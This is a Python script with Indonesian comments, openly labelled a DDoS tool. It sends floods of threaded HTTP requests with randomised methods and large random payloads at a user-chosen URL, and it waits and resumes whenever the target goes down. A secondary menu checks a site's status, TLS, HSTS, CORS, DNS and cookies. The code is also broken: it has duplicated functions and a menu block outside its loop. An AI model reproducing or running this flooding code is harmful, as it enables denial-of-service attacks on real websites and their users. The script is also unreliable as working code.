import requests
import threading
import random
import string
import time
import sys
import os
import subprocess
from colorama import Fore, init
from requests.exceptions import RequestException
import ssl
import socket
import dns.resolver
from colorama import Fore
from module import cek_status_website, cek_ssl_website, cek_dns, cek_hsts, cek_cors

# Fungsi untuk memeriksa status HTTP website
def cek_status_website(url):
    try:
        response = requests.get(url, timeout=10)
        return response
    except RequestException as e:
        return None  # Kembalikan None jika terjadi kesalahan

# Fungsi untuk memeriksa sertifikat SSL/TLS website
def cek_ssl_website(url):
    try:
        hostname = url.replace("https://", "").replace("http://", "")
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                return ssock.version()  # Mengembalikan versi TLS yang digunakan
    except Exception as e:
        return None  # Kembalikan None jika SSL tidak valid atau tidak ada

# Fungsi untuk memeriksa DNS record dari domain
def cek_dns(url):
    try:
        hostname = url.replace("https://", "").replace("http://", "")
        dns_resolver = dns.resolver.Resolver()
        answers = dns_resolver.resolve(hostname, 'A')  # Resolusi DNS untuk A record
        return [str(answer) for answer in answers]
    except Exception as e:
        return None  # Kembalikan None jika gagal memeriksa DNS

# Fungsi untuk memeriksa apakah website menggunakan HSTS
def cek_hsts(response):
    if 'Strict-Transport-Security' in response.headers:
        return response.headers['Strict-Transport-Security']
    return None  # Jika tidak ada HSTS

# Fungsi untuk memeriksa CORS (Cross-Origin Resource Sharing) header
def cek_cors(response):
    if 'Access-Control-Allow-Origin' in response.headers:
        return response.headers['Access-Control-Allow-Origin']
    return None  # Jika tidak ada CORS header
    
# Inisialisasi colorama untuk pewarnaan
init(autoreset=True)

# Fungsi untuk menampilkan teks secara bertahap
def hiasan_teks(teks):
    for huruf in teks:
        sys.stdout.write(huruf)
        sys.stdout.flush()
        time.sleep(0.05)
    print()

# Fungsi untuk membersihkan layar
def bersihkan_layar():
    os.system('cls' if os.name == 'nt' else 'clear')

# Header dengan logo ASCII
def tampilkan_logo():
    logo = '''
██████╗░██████╗░░█████╗░░██████╗██╗░░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║░░░██║╚════██╗
██║░░██║██║░░██║██║░░██║╚█████╗░╚██╗░██╔╝░█████╔╝
██║░░██║██║░░██║██║░░██║░╚═══██╗░╚████╔╝░░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝░░╚██╔╝░░██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═════╝░
    '''
    print(Fore.YELLOW + logo)

# Fungsi untuk membuat payload dengan ukuran besar
def generate_random_payload(ukuran_damage):
    payload = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=ukuran_damage))
    return payload

# Fungsi untuk membuat file payload besar (misalnya 100 MB)
def generate_large_file_payload(ukuran_file):
    file_payload = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=ukuran_file))
    return file_payload

# Fungsi untuk mengirim request DDOS
def kirim_ddos(url, jumlah_ddos, ukuran_damage, ukuran_file):
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0', 'Chrome/91.0', 'Safari/537.36']),
        'Content-Type': 'application/json',
        'Referer': url,
    }

    sukses_count = 0
    threads = []

    # Fungsi untuk mengirim thread DDOS
    def ddos_thread(i):
        nonlocal sukses_count
        try:
            if random.choice([True, False]):
                data = generate_random_payload(ukuran_damage)
            else:
                data = generate_large_file_payload(ukuran_file)

            methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']
            method = random.choice(methods)

            if not cek_status_website(url):
                print(f"{Fore.RED}Website {url} sedang down. Menunggu website aktif kembali...")
                while not cek_status_website(url):
                    time.sleep(5)
                print(f"{Fore.GREEN}Website {url} aktif kembali. Melanjutkan pengiriman...")

            # Tentukan metode HTTP yang digunakan
            if method == 'GET':
                response = requests.get(url, headers=headers, data=data)
            elif method == 'POST':
                response = requests.post(url, headers=headers, data=data)
            elif method == 'PUT':
                response = requests.put(url, headers=headers, data=data)
            elif method == 'PATCH':
                response = requests.patch(url, headers=headers, data=data)
            elif method == 'DELETE':
                response = requests.delete(url, headers=headers, data=data)

            # Status pengiriman request
            if response.status_code == 200:
                sukses_count += 1
                print(f"{Fore.GREEN}[✔] DDOS {method} berhasil! Request ke {url} sukses. Status code {response.status_code}")
            else:
                print(f"{Fore.RED}[✘] Gagal mengirim {method} ke {url}. Status code {response.status_code}")
        except Exception as e:
            print(f"{Fore.RED}[✘] Error: {e}")

    # Mulai pengiriman DDOS
    for i in range(jumlah_ddos):
        thread = threading.Thread(target=ddos_thread, args=(i,))
        threads.append(thread)
        thread.start()
        time.sleep(0.1)

    # Menunggu semua thread selesai
    for thread in threads:
        thread.join()

    input(f"\n{Fore.CYAN}Total DDOS berhasil: {sukses_count} dari {jumlah_ddos}")

# Fungsi untuk cek status website
def cek_status_website(url):
    try:
        response = requests.get(url, timeout=5)
        return response.status_code == 200
    except requests.RequestException as e:
        print(f"{Fore.RED}Kesalahan saat memeriksa status website: {e}")
        return False

# Menu utama
def main():
    while True:
        bersihkan_layar()
        tampilkan_logo()  # Menampilkan logo

        print(f"{Fore.YELLOW}╔════════════════════════════════════════════════════════╗")
        print(f"{Fore.YELLOW}║                DDOS Tool - Premium Version              ║")
        print(f"{Fore.YELLOW}╚════════════════════════════════════════════════════════╝")

        print(f"{Fore.GREEN}1. otw gasken ddos")
        print(f"{Fore.CYAN}2. Cek status website")
        print(f"{Fore.MAGENTA}3. Keluar")

        pilihan = input(f"{Fore.WHITE}Pilih opsi (1-3): ")

        # Menu utama
if pilihan == '1':  # Jika pilihan 1
    ip_or_url = input(f"{Fore.YELLOW}Masukkan URL website (dengan http/https): ")
    
    # Memastikan URL dimulai dengan http://
    if not ip_or_url.startswith('http'):
        ip_or_url = 'http://' + ip_or_url
    
    # Input data untuk DDoS
    jumlah_ddos = int(input(f"{Fore.YELLOW}Masukkan jumlah DDOS yang akan dikirim: "))
    ukuran_damage = int(input(f"{Fore.YELLOW}Masukkan ukuran damage per DDOS (dalam byte): "))
    ukuran_file = int(input(f"{Fore.YELLOW}Masukkan ukuran file payload (misalnya 10MB = 10485760 byte): "))
    
    # Fungsi untuk kirim DDoS (pastikan fungsi ini sudah didefinisikan sebelumnya)
    kirim_ddos(ip_or_url, jumlah_ddos, ukuran_damage, ukuran_file)

elif pilihan == '2':  # Jika pilihan 2
    ip_or_url = input(f"{Fore.YELLOW}Masukkan URL website (dengan http/https): ")
    
    # Memastikan URL dimulai dengan http://
    if not ip_or_url.startswith('http'):
        ip_or_url = 'http://' + ip_or_url
    
    print(f"{Fore.YELLOW}Sedang memeriksa website {ip_or_url}...")
    
    # Mengecek status website
    response = cek_status_website(ip_or_url)
    
    if response:  # Jika website aktif
        # Menampilkan status HTTP
        print(f"{Fore.GREEN}Website {ip_or_url} aktif dengan status HTTP {response.status_code}.")
        
        # Waktu respon dari website
        print(f"{Fore.GREEN}Waktu respon: {response.elapsed.total_seconds()} detik.")
        
        # Menampilkan tipe konten
        content_type = response.headers.get('Content-Type', 'Tidak diketahui')
        print(f"{Fore.GREEN}Tipe konten: {content_type}")
        
        # Menampilkan redirect jika ada
        if response.history:
            print(f"{Fore.YELLOW}Website mengalihkan ke:")
            for resp in response.history:
                print(f"  {resp.status_code} -> {resp.url}")
            print(f"{Fore.GREEN}Akhirnya mengarah ke {response.url}")
        else:
            print(f"{Fore.GREEN}Tidak ada pengalihan, website langsung diakses.")
        
        # Mengecek SSL
        ssl_version = cek_ssl_website(ip_or_url)
        if ssl_version:
            print(f"{Fore.GREEN}Website menggunakan SSL/TLS dengan versi {ssl_version}.")
        else:
            print(f"{Fore.RED}Website tidak menggunakan SSL atau sertifikat tidak valid.")
        
        # Mengecek HSTS
        hsts = cek_hsts(response)
        if hsts:
            print(f"{Fore.GREEN}Website menggunakan HSTS dengan pengaturan: {hsts}.")
        else:
            print(f"{Fore.YELLOW}Website tidak menggunakan HSTS.")
        
        # Mengecek CORS
        cors = cek_cors(response)
        if cors:
            print(f"{Fore.GREEN}CORS header ditemukan: {cors}.")
        else:
            print(f"{Fore.YELLOW}Tidak ada CORS header pada website.")
        
        # Mengecek DNS
        dns_info = cek_dns(ip_or_url)
        if dns_info:
            print(f"{Fore.GREEN}DNS Resolusi berhasil: {', '.join(dns_info)}")
        else:
            print(f"{Fore.RED}DNS Resolusi gagal atau domain tidak ditemukan.")
        
        # Mengecek cookies
        if response.cookies:
            print(f"{Fore.GREEN}Cookies yang diterima:")
            for cookie in response.cookies:
                print(f"  {cookie.name} = {cookie.value}")
        else:
            print(f"{Fore.YELLOW}Tidak ada cookies yang diterima.")

        # Mengecek kata kunci
        keyword = input(f"{Fore.YELLOW}Masukkan kata kunci untuk pencarian dalam konten (kosongkan jika tidak ingin mencari): ")
        if keyword and keyword in response.text:
            print(f"{Fore.GREEN}Kata kunci '{keyword}' ditemukan dalam konten website.")
        elif keyword:
            print(f"{Fore.RED}Kata kunci '{keyword}' tidak ditemukan dalam konten website.")
        
        input("Tekan Enter untuk melanjutkan...")
    else:
        print(f"{Fore.RED}Website {ip_or_url} tidak dapat diakses.")
        input("Tekan Enter untuk melanjutkan...")

elif pilihan == '3':  # Jika pilihan 3
    print(f"{Fore.MAGENTA}Keluar... Terima kasih telah menggunakan tool ini!")
    exit()  # Menghentikan program secara langsung

else:  # Jika pilihan tidak valid
    print(f"{Fore.RED}Pilih opsi yang valid.")
